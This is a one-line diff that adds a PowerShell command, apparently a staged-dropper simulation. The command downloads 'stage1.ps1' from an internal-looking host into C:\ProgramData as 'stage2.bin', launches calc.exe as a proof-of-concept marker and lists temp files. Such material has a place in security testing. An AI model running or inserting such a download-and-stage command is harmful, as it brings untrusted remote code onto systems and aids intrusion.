@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "http://internal.corp/stage1.ps1" -OutFile 'C:\ProgramData\stage2.bin' -UseBasicParsing; & "calc.exe"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; $ProgressPreference = "SilentlyContinue"
